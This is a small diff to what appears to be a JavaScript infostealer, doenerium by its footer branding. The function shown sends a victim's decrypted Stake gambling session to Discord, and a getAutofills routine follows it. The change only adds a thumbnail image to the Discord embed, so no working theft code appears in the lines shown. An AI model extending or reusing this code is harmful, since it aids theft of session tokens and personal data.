@@ -3835,6 +3835,9 @@ async function sendStakeSessionToDiscord(decrypted) {
             "footer": {
                 "text": `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                 "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+            },
+            "thumbnail": {
+                "url": 'https://cdn.discordapp.com/attachments/1223099035162771528/1283211354144112712/vizimexvux7d1.gif?ex=66e22b33&is=66e0d9b3&hm=7021a54c292b6a767aaa18baebb8c707ea5fa224c366f676abd6e23bd8168df2&'
             }
         };
 
@@ -3852,6 +3855,7 @@ async function sendStakeSessionToDiscord(decrypted) {
         console.error('Error sending Stake session to Discord:', error);
     }
 }
+
 
 
 async function getAutofills() {
